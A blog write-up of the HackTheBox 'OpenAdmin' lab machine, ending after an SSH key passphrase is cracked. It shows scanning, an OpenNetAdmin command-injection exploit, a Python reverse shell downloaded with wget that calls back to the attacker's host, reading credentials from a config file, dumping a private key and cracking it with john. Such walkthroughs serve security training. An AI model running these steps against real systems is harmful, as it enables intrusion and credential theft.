@@ -1,0 +1,848 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>OpenAdmin HTB WriteUp :: Blog</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="HTB OpenAdmin writeup HackTheBox OpenAdmin machine write up, easy Linux machine. The process as always: Scan &amp;ndash;&amp;gt; Initial foothold &amp;ndash;&amp;gt; Own User &amp;ndash;&amp;gt; Own Root.
+Initial Scan bash    # added to hosts as 10.10.10.171 OpenAdmin $ sudo nmap -sV -sC -sT -O -o nmapinitial OpenAdmin   Scan results nmap    Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-07 02:44 CET Nmap scan report for OpenAdmin (10." />
+<meta name="keywords" content="write, blog" />
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="https://raulmart.in/posts/openadmin-writeup/" />
+
+
+
+
+
+
+
+<link rel="stylesheet" href="https://raulmart.in/css/style.min.css">
+
+
+
+
+<link rel="stylesheet" href="https://raulmart.in/style.css">
+
+
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://raulmart.in/img/apple-touch-icon-144-precomposed.png">
+
+  <link rel="shortcut icon" href="https://raulmart.in/img/favicon/orange.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+<meta name="twitter:creator" content="Raúl Martín" />
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="OpenAdmin HTB WriteUp :: Blog">
+<meta property="og:description" content="HackTheBox OpenAdmin machine write up. Easy Linux machine." />
+<meta property="og:url" content="https://raulmart.in/posts/openadmin-writeup/" />
+<meta property="og:site_name" content="OpenAdmin HTB WriteUp" />
+
+  <meta property="og:image" content="https://raulmart.in/cover/openadmin.png">
+
+<meta property="og:image:width" content="2048">
+<meta property="og:image:height" content="1024">
+
+
+  <meta property="article:published_time" content="2020-01-19 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body class="orange">
+
+
+<div class="container center headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    Blog
+  </div>
+</a>
+
+    </div>
+    <div class="menu-trigger">menu</div>
+  </div>
+  
+    <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/about">About</a></li>
+        
+      
+        
+          <li><a href="/tags/writeup/">WriteUps</a></li>
+        
+      
+      
+    
+
+    
+    <div class="spacer"></div>
+    <ul class="language-selector">
+      <ul class="language-selector-current">
+          <li>English ▾</li>
+      </ul>
+      <ul class="language-selector__more hidden">
+        
+        <li><a href="https://raulmart.in/">English</a></li>
+        
+        <li><a href="https://raulmart.in/es/">Español</a></li>
+        
+      </ul>
+    </ul>
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/about">About</a></li>
+      
+    
+      
+        <li><a href="/tags/writeup/">WriteUps</a></li>
+      
+    
+    
+    <hr />
+        
+          <li>
+            <a href="https://raulmart.in/">English</a>
+          </li>
+        
+          <li>
+            <a href="https://raulmart.in/es/">Español</a>
+          </li>
+        
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<div class="post">
+  <h1 class="post-title">
+    <a href="https://raulmart.in/posts/openadmin-writeup/">OpenAdmin HTB WriteUp</a></h1>
+  <div class="post-meta">
+    
+      <span class="post-date">
+        2020-01-19 
+      </span>
+    
+    
+    <span class="post-author">:: Raúl Martín</span>
+    
+  </div>
+
+  
+  <span class="post-tags">
+    
+    #<a href="https://raulmart.in/tags/writeup/">writeup</a>&nbsp;
+    
+    #<a href="https://raulmart.in/tags/hackthebox/">hackthebox</a>&nbsp;
+    
+    #<a href="https://raulmart.in/tags/linux/">linux</a>&nbsp;
+    
+    #<a href="https://raulmart.in/tags/easy/">easy</a>&nbsp;
+    
+  </span>
+  
+
+  
+    <img src="https://raulmart.in/cover/openadmin.png" class="post-cover" alt="OpenAdmin HTB WriteUp" />
+  
+
+  
+
+  <div class="post-content"><div>
+        <h1 id="htb-openadmin-writeup">HTB OpenAdmin writeup<a href="#htb-openadmin-writeup" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>HackTheBox OpenAdmin machine write up, easy Linux machine.
+The process as always: Scan &ndash;&gt; Initial foothold &ndash;&gt; Own User &ndash;&gt; Own Root.</p>
+<h2 id="initial-scan">Initial Scan<a href="#initial-scan" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+
+
+
+  <div class="collapsable-code">
+    <input id="351248769" type="checkbox"  />
+    <label for="351248769">
+      <span class="collapsable-code__language">bash</span>
+      
+      <span class="collapsable-code__toggle" data-label-expand="△" data-label-collapse="▽"></span>
+    </label>
+    <pre class="language-bash" ><code>
+# added to hosts as 10.10.10.171    OpenAdmin
+$ sudo nmap -sV -sC -sT -O -o nmapinitial OpenAdmin
+</code></pre>
+  </div>
+
+
+<p>Scan results
+
+
+
+  <div class="collapsable-code">
+    <input id="659423817" type="checkbox"  />
+    <label for="659423817">
+      <span class="collapsable-code__language">nmap</span>
+      
+      <span class="collapsable-code__toggle" data-label-expand="△" data-label-collapse="▽"></span>
+    </label>
+    <pre class="language-nmap" ><code>
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-07 02:44 CET
+Nmap scan report for OpenAdmin (10.10.10.171)
+Host is up (0.12s latency).
+Not shown: 995 closed ports
+PORT      STATE    SERVICE       VERSION
+22/tcp    open     ssh           OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
+|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
+|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
+80/tcp    open     tcpwrapped
+1063/tcp  filtered kyoceranetdev
+10621/tcp filtered unknown
+15003/tcp filtered unknown
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.80%E=4%D=1/7%OT=22%CT=1%CU=35292%PV=Y%DS=2%DC=I%G=Y%TM=5E13E2EC
+OS:%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)SEQ(
+OS:SP=106%GCD=1%ISR=10A%TI=Z%CI=Z%TS=A)OPS(O1=M54DST11NW7%O2=M54DST11NW7%O3
+OS:=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11NW7%O6=M54DST11)WIN(W1=7120%W2=7
+OS:120%W3=7120%W4=7120%W5=7120%W6=7120)ECN(R=Y%DF=Y%T=40%W=7210%O=M54DNNSNW
+OS:7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S&#43;%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF
+OS:=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S&#43;%F=AR%O=
+OS:%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=
+OS:0%S=Z%A=S&#43;%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RI
+OS:PCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)
+
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 136.42 seconds
+
+</code></pre>
+  </div>
+
+</p>
+<p>We got an OpenSSH server, a webserver running Apache and several filtered ports.</p>
+<p><img src="images/80.png" alt="Website on port 80"></p>
+<p>The website on port 80 looks like the default, lets launch dirbuster in the background just in case.</p>
+<p><img src="images/dirbuster.png" alt="Dirbuster Results"></p>
+<p>There are two paths that looks promising, <code>/music/</code> and <code>/ona/</code>. <code>/music/</code> does not seem to contain anything besides the link to <code>/ona/</code>, lets analyze <code>/ona/</code>.</p>
+<p><img src="images/ona.png" alt="OpenNetAdmin Web"></p>
+<p>We have an <a href="http://opennetadmin.com/">OpenNetAdmin</a> <code>v18.1.1</code>, which seems to be outdated. Searching for <code>OpenNetAdmin 18.1.1</code> in Google gives us info about an existing command injection vulnerability, and two potential ways to exploit it, via the Metasploit module or a bash script.</p>
+<p><img src="images/vuln.png" alt="OpenNetAdmin Vuln">
+Screnshoot of the Metasploit module in ExploitDB.</p>
+<p>Results of <code>searchsploit</code>:
+
+
+
+  <div class="collapsable-code">
+    <input id="796158324" type="checkbox"  />
+    <label for="796158324">
+      <span class="collapsable-code__language">bash</span>
+      
+      <span class="collapsable-code__toggle" data-label-expand="△" data-label-collapse="▽"></span>
+    </label>
+    <pre class="language-bash" ><code>
+~$ searchsploit OpenNetAdmin
+--------------------------------------------------------------- ----------------------------------------
+ Exploit Title                                                 |  Path
+                                                               | (/usr/share/exploitdb/)
+--------------------------------------------------------------- ----------------------------------------
+OpenNetAdmin 13.03.01 - Remote Code Execution                  | exploits/php/webapps/26682.txt
+OpenNetAdmin 18.1.1 - Command Injection Exploit (Metasploit)   | exploits/php/webapps/47772.rb
+OpenNetAdmin 18.1.1 - Remote Code Execution                    | exploits/php/webapps/47691.sh
+--------------------------------------------------------------- ----------------------------------------
+Shellcodes: No Result
+</code></pre>
+  </div>
+
+</p>
+<p>The module is not in Metasploit, we can add it using the instructions provided in this <a href="https://medium.com/@pentest_it/how-to-add-a-module-to-metasploit-from-exploit-db-d389c2a33f6d">article</a> or use the bash script.</p>
+<h2 id="initial-foothold">Initial foothold<a href="#initial-foothold" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>I will use the Metasploit module for the convenience, lets add it and try it.</p>
+
+
+
+  <div class="collapsable-code">
+    <input id="129864357" type="checkbox"  />
+    <label for="129864357">
+      <span class="collapsable-code__language">bash</span>
+      
+      <span class="collapsable-code__toggle" data-label-expand="△" data-label-collapse="▽"></span>
+    </label>
+    <pre class="language-bash" ><code>
+$ mkdir -p ~/.msf4/modules/exploits/php/webapps/
+$ cp /usr/share/exploitdb/exploits/php/webapps/47772.rb ~/.msf4/modules/exploits/php/webapps/
+$ sudo updatedb
+$ msfconsole
+
+       =[ metasploit v5.0.67-dev                          ]
+&#43; -- --=[ 1958 exploits - 1093 auxiliary - 336 post       ]
+&#43; -- --=[ 558 payloads - 45 encoders - 10 nops            ]
+&#43; -- --=[ 7 evasion                                       ]
+
+msf5 &gt; search opennetadmin
+
+Matching Modules
+================
+
+   #  Name                       Disclosure Date  Rank       Check  Description
+   -  ----                       ---------------  ----       -----  -----------
+   0  exploit/php/webapps/47772  2019-11-19       excellent  Yes    OpenNetAdmin Ping Command Injection
+
+
+msf5 &gt; use 0
+msf5 exploit(php/webapps/47772) &gt; show options
+
+Module options (exploit/php/webapps/47772):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39;
+   RPORT      80               yes       The target port (TCP)
+   SRVHOST    0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
+   SRVPORT    8080             yes       The local port to listen on.
+   SSL        false            no        Negotiate SSL/TLS for outgoing connections
+   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
+   TARGETURI  /ona/login.php   yes       Base path
+   URIPATH                     no        The URI to use for this exploit (default is random)
+   VHOST                       no        HTTP server virtual host
+
+
+Payload options (linux/x86/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST                   yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic Target
+
+
+msf5 exploit(php/webapps/47772) &gt;
+
+</code></pre>
+  </div>
+
+
+<p>After configuring it I could not manage to make it work, so lets use the script.</p>
+
+
+
+  <div class="collapsable-code">
+    <input id="368529417" type="checkbox"  />
+    <label for="368529417">
+      <span class="collapsable-code__language">bash</span>
+      
+      <span class="collapsable-code__toggle" data-label-expand="△" data-label-collapse="▽"></span>
+    </label>
+    <pre class="language-bash" ><code>
+~$ /usr/share/exploitdb/exploits/php/webapps/47691.sh http://openadmin/ona/
+
+$ who
+joanna   pts/0        Jan  7 15:52 (10.10.14.143)
+jimmy    pts/1        Jan  7 15:52 (10.10.14.42)
+jimmy    pts/2        Jan  7 15:52 (10.10.14.244)
+jimmy    pts/4        Jan  7 15:53 (10.10.15.102)
+
+$ whoami
+www-data
+</code></pre>
+  </div>
+
+
+<p>We got an initial foothold.</p>
+<h2 id="user">User<a href="#user" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>We have a low level shell with www-data privileges, lets try to escalate to user.</p>
+<p>First lets get a better shell:
+
+
+
+  <div class="collapsable-code">
+    <input id="361589247" type="checkbox"  />
+    <label for="361589247">
+      <span class="collapsable-code__language">bash</span>
+      
+      <span class="collapsable-code__toggle" data-label-expand="△" data-label-collapse="▽"></span>
+    </label>
+    <pre class="language-bash" ><code>
+
+## On our computer
+# Create reverseshell
+echo &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;10.10.15.75&#34;,1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/bash&#34;,&#34;-i&#34;]); &gt;shell.py&#39;
+
+# Webserver to send file to target machine, wait for connections with nc
+sudo python3 -m http.server 80
+nc -lvp 1337
+
+## On the server, create a hidden dir so we do not interfere with other people
+www-data@openadmin:...$ mkdir /tmp/.my
+www-data@openadmin:...$ wget -O /tmp/.my/shell.py http://10.10.15.75:80/shell.py
+www-data@openadmin:...$ python3 /tmp/.my/shell.py
+</code></pre>
+  </div>
+
+</p>
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
+<p>We know that the server is Apache, the first idea that comes to my mind is view the website config files, is case there are any other websites, and to obtain the path from where the files are being served. Listing the <code>sites-available</code> directory gives us an interesting piece of info:</p>
+
+
+
+  <div class="collapsable-code">
+    <input id="138647295" type="checkbox"  />
+    <label for="138647295">
+      <span class="collapsable-code__language">bash</span>
+      
+      <span class="collapsable-code__toggle" data-label-expand="△" data-label-collapse="▽"></span>
+    </label>
+    <pre class="language-bash" ><code>
+$ ls -lshA /etc/apache2/sites-available
+total 16K
+8.0K -rw-r--r-- 1 root root 6.2K Jul 16 18:14 default-ssl.conf
+4.0K -rw-r--r-- 1 root root  303 Nov 23 17:13 internal.conf
+4.0K -rw-r--r-- 1 root root 1.3K Nov 22 14:24 openadmin.conf
+
+
+$ cat /etc/apache2/sites-available/internal.conf
+Listen 127.0.0.1:52846
+
+&lt;VirtualHost 127.0.0.1:52846&gt;
+    ServerName internal.openadmin.htb
+    DocumentRoot /var/www/internal
+
+&lt;IfModule mpm_itk_module&gt;
+AssignUserID joanna joanna
+&lt;/IfModule&gt;
+
+    ErrorLog ${APACHE_LOG_DIR}/error.log
+    CustomLog ${APACHE_LOG_DIR}/access.log combined
+
+&lt;/VirtualHost&gt;
+</code></pre>
+  </div>
+
+
+<p>The <code>internal</code> site seems interesting, using <code>curl</code> on the machine gives us a login form. I cannot think of anything easily exploitable (let&rsquo;s leave SQLi or other web attacks as a last resource) so lets look for other things.</p>
+<p>At this point I tried running several enumeration tools but none seemed to give any interesing info, after a lot of <code>ls</code>ing and <code>cat</code>ing around and many dead ends I finally found a potential password in <code>/opt/ona/www/local/config/database_settings.inc.php</code>:</p>
+
+
+
+  <div class="collapsable-code">
+    <input id="564371829" type="checkbox"  />
+    <label for="564371829">
+      <span class="collapsable-code__language">bash</span>
+      
+      <span class="collapsable-code__toggle" data-label-expand="△" data-label-collapse="▽"></span>
+    </label>
+    <pre class="language-bash" ><code>
+$ cat /opt/ona/www/local/config/database*
+&lt;?php
+
+$ona_contexts=array (
+  &#39;DEFAULT&#39; =&gt;
+  array (
+    &#39;databases&#39; =&gt;
+    array (
+      0 =&gt;
+      array (
+        &#39;db_type&#39; =&gt; &#39;mysqli&#39;,
+        &#39;db_host&#39; =&gt; &#39;localhost&#39;,
+        &#39;db_login&#39; =&gt; &#39;ona_sys&#39;,
+        &#39;db_passwd&#39; =&gt; &#39;n1nj4W4rri0R!&#39;,
+        &#39;db_database&#39; =&gt; &#39;ona_default&#39;,
+        &#39;db_debug&#39; =&gt; false,
+      ),
+    ),
+    &#39;description&#39; =&gt; &#39;Default data context&#39;,
+    &#39;context_color&#39; =&gt; &#39;#D3DBFF&#39;,
+  ),
+);
+</code></pre>
+  </div>
+
+
+<p>Let&rsquo;s try the password with <code>SSH</code> with the three users we know are in the machine, <code> root</code>, <code>jimmy</code> y <code>joanna</code> (as seen in <code>/home</code>)</p>
+
+
+
+  <div class="collapsable-code">
+    <input id="397418526" type="checkbox"  />
+    <label for="397418526">
+      <span class="collapsable-code__language">bash</span>
+      
+      <span class="collapsable-code__toggle" data-label-expand="△" data-label-collapse="▽"></span>
+    </label>
+    <pre class="language-bash" ><code>
+~/htb/OpenAdmin$ ssh jimmy@OpenAdmin
+The authenticity of host &#39;openadmin (10.10.10.171)&#39; can&#39;t be established.
+ECDSA key fingerprint is SHA256:loIRDdkV6Zb9r8OMF3jSDMW3MnV5lHgn4wIRq&#43;vmBJY.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added &#39;openadmin,10.10.10.171&#39; (ECDSA) to the list of known hosts.
+jimmy@openadmin&#39;s password:
+Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Thu Jan  9 19:40:21 UTC 2020
+
+  System load:  0.26              Processes:             435
+  Usage of /:   49.2% of 7.81GB   Users logged in:       2
+  Memory usage: 41%               IP address for ens160: 10.10.10.171
+  Swap usage:   0%
+
+  =&gt; There is 1 zombie process.
+
+
+ * Canonical Livepatch is available for installation.
+   - Reduce system reboots and improve kernel security. Activate at:
+     https://ubuntu.com/livepatch
+
+41 packages can be updated.
+12 updates are security updates.
+
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+</code></pre>
+  </div>
+
+
+<p>Jimmy home directory is empty, but remember the <code>internal</code> directory inside <code>/var/www</code>? Lets have a look now:</p>
+<p>
+
+
+  <div class="collapsable-code">
+    <input id="852719643" type="checkbox"  />
+    <label for="852719643">
+      <span class="collapsable-code__language">bash</span>
+      
+      <span class="collapsable-code__toggle" data-label-expand="△" data-label-collapse="▽"></span>
+    </label>
+    <pre class="language-bash" ><code>
+
+jimmy@openadmin:/var/www/internal$ ls -lshA
+total 20K
+4.0K -rwxrwxr-x 1 jimmy jimmy     918 Jan  9 19:33 a.php
+4.0K -rwxrwxr-x 1 jimmy internal 3.2K Nov 22 23:24 index.php
+4.0K -rwxrwxr-x 1 jimmy internal  185 Nov 23 16:37 logout.php
+4.0K -rwxrwxr-x 1 jimmy internal  339 Nov 23 17:40 main.php
+4.0K -rwxrwxr-x 1 jimmy jimmy     916 Jan  9 19:40 test.php
+jimmy@openadmin:/var/www/internal$ cat index.php
+</code></pre>
+  </div>
+
+
+
+
+
+  <div class="collapsable-code">
+    <input id="243865179" type="checkbox"  />
+    <label for="243865179">
+      <span class="collapsable-code__language">php</span>
+      
+      <span class="collapsable-code__toggle" data-label-expand="△" data-label-collapse="▽"></span>
+    </label>
+    <pre class="language-php" ><code>
+&lt;?php
+[...]
+   &lt;body&gt;
+
+      &lt;h2&gt;Enter Username and Password&lt;/h2&gt;
+      &lt;div class = &#34;container form-signin&#34;&gt;
+        &lt;h2 class=&#34;featurette-heading&#34;&gt;Login Restricted.&lt;span class=&#34;text-muted&#34;&gt;&lt;/span&gt;&lt;/h2&gt;
+          &lt;?php
+            $msg = &#39;&#39;;
+
+            if (isset($_POST[&#39;login&#39;]) &amp;&amp; !empty($_POST[&#39;username&#39;]) &amp;&amp; !empty($_POST[&#39;password&#39;])) {
+              if ($_POST[&#39;username&#39;] == &#39;jimmy&#39; &amp;&amp; hash(&#39;sha512&#39;,$_POST[&#39;password&#39;]) == &#39;00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1&#39;) {
+                  $_SESSION[&#39;username&#39;] = &#39;jimmy&#39;;
+                  header(&#34;Location: /main.php&#34;);
+              } else {
+                  $msg = &#39;Wrong username or password.&#39;;
+              }
+            }
+         ?&gt;
+      &lt;/div&gt; &lt;!-- /container --&gt;
+
+      &lt;div class = &#34;container&#34;&gt;
+
+         &lt;form class = &#34;form-signin&#34; role = &#34;form&#34;
+            action = &#34;&lt;?php echo htmlspecialchars($_SERVER[&#39;PHP_SELF&#39;]);
+            ?&gt;&#34; method = &#34;post&#34;&gt;
+            &lt;h4 class = &#34;form-signin-heading&#34;&gt;&lt;?php echo $msg; ?&gt;&lt;/h4&gt;
+            &lt;input type = &#34;text&#34; class = &#34;form-control&#34;
+               name = &#34;username&#34;
+               required autofocus&gt;&lt;/br&gt;
+            &lt;input type = &#34;password&#34; class = &#34;form-control&#34;
+               name = &#34;password&#34; required&gt;
+            &lt;button class = &#34;btn btn-lg btn-primary btn-block&#34; type = &#34;submit&#34;
+               name = &#34;login&#34;&gt;Login&lt;/button&gt;
+         &lt;/form&gt;
+
+      &lt;/div&gt;
+
+   &lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+  </div>
+
+
+The <code>index.php</code> consists of a login form where if the user and password match we get redirected to <code>/main.php</code>. Let&rsquo;s see the contents of <code>main.php</code>:</p>
+
+
+
+  <div class="collapsable-code">
+    <input id="389647125" type="checkbox"  />
+    <label for="389647125">
+      <span class="collapsable-code__language">php</span>
+      
+      <span class="collapsable-code__toggle" data-label-expand="△" data-label-collapse="▽"></span>
+    </label>
+    <pre class="language-php" ><code>
+jimmy@openadmin:/var/www/internal$ cat main.php
+
+&lt;?php session_start(); if (!isset ($_SESSION[&#39;username&#39;])) { header(&#34;Location: /index.php&#34;); };
+# Open Admin Trusted
+# OpenAdmin
+$output = shell_exec(&#39;cat /home/joanna/.ssh/id_rsa&#39;);
+echo &#34;&lt;pre&gt;$output&lt;/pre&gt;&#34;;
+?&gt;
+&lt;html&gt;
+&lt;h3&gt;Don&#39;t forget your &#34;ninja&#34; password&lt;/h3&gt;
+Click here to logout &lt;a href=&#34;logout.php&#34; tite = &#34;Logout&#34;&gt;Session
+&lt;/html&gt;
+</code></pre>
+  </div>
+
+
+<p>As seen in the code, if we are logged in the server will send us joanna&rsquo;s private key.
+We can just comment the check (&quot;//&rdquo; before the if(!is&hellip;) ) and access the file using <code>curl</code>.
+Remember it is good practice to undo your changes or reset the machine after you are done so other users do not get affected.</p>
+
+
+
+  <div class="collapsable-code">
+    <input id="238567419" type="checkbox"  />
+    <label for="238567419">
+      <span class="collapsable-code__language">bash</span>
+      
+      <span class="collapsable-code__toggle" data-label-expand="△" data-label-collapse="▽"></span>
+    </label>
+    <pre class="language-bash" ><code>
+jimmy@openadmin:/var/www/internal$ cp main.php .main.php
+jimmy@openadmin:/var/www/internal$ nano .main.php
+jimmy@openadmin:/var/www/internal$ curl 127.0.0.1:52846/.main.php
+
+&lt;pre&gt;-----BEGIN RSA PRIVATE KEY-----
+Proc-Type: 4,ENCRYPTED
+DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D
+
+kG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8
+ad/StMWJ&#43;MkQ5MnAMJglQeUbRxcBP6&#43;&#43;Hh251jMcg8ygYcx1UMD03ZjaRuwcf0YO
+ShNbbx8Euvr2agjbF&#43;ytimDyWhoJXU&#43;UpTD58L&#43;SIsZzal9U8f&#43;Txhgq9K2KQHBE
+6xaubNKhDJKs/6YJVEHtYyFbYSbtYt4lsoAyM8w&#43;pTPVa3LRWnGykVR5g79b7lsJ
+ZnEPK07fJk8JCdb0wPnLNy9LsyNxXRfV3tX4MRcjOXYZnG2Gv8KEIeIXzNiD5/Du
+y8byJ/3I3/EsqHphIHgD3UfvHy9naXc/nLUup7s0&#43;WAZ4AUx/MJnJV2nN8o69JyI
+9z7V9E4q/aKCh/xpJmYLj7AmdVd4DlO0ByVdy0SJkRXFaAiSVNQJY8hRHzSS7&#43;k4
+piC96HnJU&#43;Z8&#43;1XbvzR93Wd3klRMO7EesIQ5KKNNU8PpT&#43;0lv/dEVEppvIDE/8h/
+/U1cPvX9Aci0EUys3naB6pVW8i/IY9B6Dx6W4JnnSUFsyhR63WNusk9QgvkiTikH
+40ZNca5xHPij8hvUR2v5jGM/8bvr/7QtJFRCmMkYp7FMUB0sQ1NLhCjTTVAFN/AZ
+fnWkJ5u&#43;To0qzuPBWGpZsoZx5AbA4Xi00pqqekeLAli95mKKPecjUgpm&#43;wsx8epb
+9FtpP4aNR8LYlpKSDiiYzNiXEMQiJ9MSk9na10B5FFPsjr&#43;yYEfMylPgogDpES80
+X1VZ&#43;N7S8ZP&#43;7djB22vQ&#43;/pUQap3PdXEpg3v6S4bfXkYKvFkcocqs8IivdK1&#43;UFg
+S33lgrCM4/ZjXYP2bpuE5v6dPq&#43;hZvnmKkzcmT1C7YwK1XEyBan8flvIey/ur/4F
+FnonsEl16TZvolSt9RH/19B7wfUHXXCyp9sG8iJGklZvteiJDG45A4eHhz8hxSzh
+Th5w5guPynFv610HJ6wcNVz2MyJsmTyi8WuVxZs8wxrH9kEzXYD/GtPmcviGCexa
+RTKYbgVn4WkJQYncyC0R1Gv3O8bEigX4SYKqIitMDnixjM6xU0URbnT1&#43;8VdQH7Z
+uhJVn1fzdRKZhWWlT&#43;d&#43;oqIiSrvd6nWhttoJrjrAQ7YWGAm2MBdGA/MxlYJ9FNDr
+1kxuSODQNGtGnWZPieLvDkwotqZKzdOg7fimGRWiRv6yXo5ps3EJFuSU1fSCv2q2
+XGdfc8ObLC7s3KZwkYjG82tjMZU&#43;P5PifJh6N0PqpxUCxDqAfY&#43;RzcTcM/SLhS79
+yPzCZH8uWIrjaNaZmDSPC/z&#43;bWWJKuu4Y1GCXCqkWvwuaGmYeEnXDOxGupUchkrM
+&#43;4R21WQ&#43;eSaULd2PDzLClmYrplnpmbD7C7/ee6KDTl7JMdV25DM9a16JYOneRtMt
+qlNgzj0Na4ZNMyRAHEl1SF8a72umGO2xLWebDoYf5VSSSZYtCNJdwt3lF7I8&#43;adt
+z0glMMmjR2L5c2HdlTUt5MgiY8&#43;qkHlsL6M91c4diJoEXVh&#43;8YpblAoogOHHBlQe
+K1I1cqiDbVE/bmiERK&#43;G4rqa0t7VQN6t2VWetWrGb&#43;Ahw/iMKhpITWLWApA3k9EN
+-----END RSA PRIVATE KEY-----
+&lt;/pre&gt;&lt;html&gt;
+&lt;h3&gt;Don&#39;t forget your &#34;ninja&#34; password&lt;/h3&gt;
+Click here to logout &lt;a href=&#34;logout.php&#34; tite = &#34;Logout&#34;&gt;Session
+&lt;/html&gt;
+
+jimmy@openadmin:/var/www/internal$ rm .main.php
+
+</code></pre>
+  </div>
+
+
+<p>We will save the key as <code>joanna.key</code>, but because it is encrypted we will need to crack it first.
+
+
+
+  <div class="collapsable-code">
+    <input id="193278465" type="checkbox"  />
+    <label for="193278465">
+      <span class="collapsable-code__language">bash</span>
+      
+      <span class="collapsable-code__toggle" data-label-expand="△" data-label-collapse="▽"></span>
+    </label>
+    <pre class="language-bash" ><code>
+~/htb/OpenAdmin$ nano joanna.key
+~/htb/OpenAdmin$ chmod 400 joanna.key
+~/htb/OpenAdmin$ ssh joanna@OpenAdmin -i joanna.key
+# We do not know the password, ninja does not work
+Enter passphrase for key &#39;joanna.key&#39;:
+Enter passphrase for key &#39;joanna.key&#39;:
+Enter passphrase for key &#39;joanna.key&#39;:
+
+~/htb/OpenAdmin$ python3 /usr/share/john/ssh2john.py joanna.key &gt;pw
+  /usr/share/john/ssh2john.py:103: DeprecationWarning: decodestring() is a deprecated alias since Python 3.1, use decodebytes()
+    data = base64.decodestring(data)
+
+~/htb/OpenAdmin$ john --wordlist=/usr/share/wordlists/rockyou.txt pw
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
+Cost 2 (iteration count) is 1 for all loaded hashes
+Will run 4 OpenMP threads
+Note: This format may emit false positives, so it will keep trying even after
+finding a possible candidate.
+Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
+bloodninjas      (joanna.key)
+Warning: Only 2 candidates left, minimum 4 needed for performance.
+1g 0:00:00:08 DONE (2020-01-10 01:16) 0.1219g/s 1748Kp/s 1748Kc/s 1748KC/sa6_123..*7¡Vamos!
+Session completed
+</code></pre>
+  </div>
+
+</p>
+<p>We got a match, lets test it.
+
+
+
+  <div class="collapsable-code">
+    <input id="931256748" type="checkbox"  />
+    <label for="931256748">
